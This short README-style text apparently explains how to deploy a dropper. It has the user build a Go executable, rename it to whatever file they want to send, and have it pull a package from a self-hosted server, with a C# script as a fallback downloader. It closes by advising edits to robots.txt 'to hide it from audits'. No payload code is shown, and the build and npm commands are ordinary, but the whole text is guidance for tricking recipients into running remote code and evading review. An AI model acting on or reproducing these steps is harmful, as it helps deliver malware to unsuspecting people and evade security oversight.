To compile "compiler": `go build -o compiler.exe compiler.go` (replace compiler.exe with the name of the executable you want to send)


When you execute "compiler.exe", it will attempt to download the specified package. If it fails, it will compile and execute a C# script to try downloading the package again, making the C# script act like a failsafe.

---

Host a simple http server using codespace so the go script can install the package without it hurting your wallet to host via cloud

* set up a new Node.js project and install the necessary packages:
```
mkdir my-secure-app
cd my-secure-app
npm init -y
npm install express helmet express-rate-limit cors
```

* start your web server
`node server.js`


---

add the code in the doc/web/robot.txt to your page's robot.txt script to hide it from audits, once hidden you can still install the package using the compiler
